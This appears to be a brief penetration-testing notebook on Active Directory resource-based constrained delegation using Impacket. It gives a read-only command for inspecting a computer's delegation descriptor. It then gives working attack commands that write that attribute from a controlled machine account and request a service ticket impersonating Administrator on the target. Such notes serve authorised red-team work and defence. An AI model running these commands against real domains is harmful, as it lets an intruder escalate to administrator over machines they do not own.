## Read a computer's allowed-to-act descriptor

**Run in:** Kali. **Requires:** A directory identity that can read the target computer; the password is prompted. This example does not write the descriptor.

```bash
impacket-rbcd -delegate-to 'TARGET$' -action read -dc-ip DC_IP 'DOMAIN_FQDN/USER'
```

**What the result establishes:** Read the target computer's allowed-to-act descriptor and resolve the principals it authorizes.

**Next check:** Resolve each SID and verify the controlled identity's prerequisites before considering any delegated service request.

## Resource-Based (RBCD)

**Notebook example**

```bash
# You have GenericWrite over a computer object -> set msDS-AllowedToActOnBehalfOfOtherIdentity
rbcd.py -delegate-from FAKE$ -delegate-to TARGET$ -action write $DOMAIN/USER:PASS
getST.py -spn cifs/TARGET -impersonate Administrator $DOMAIN/FAKE$:PASS
```
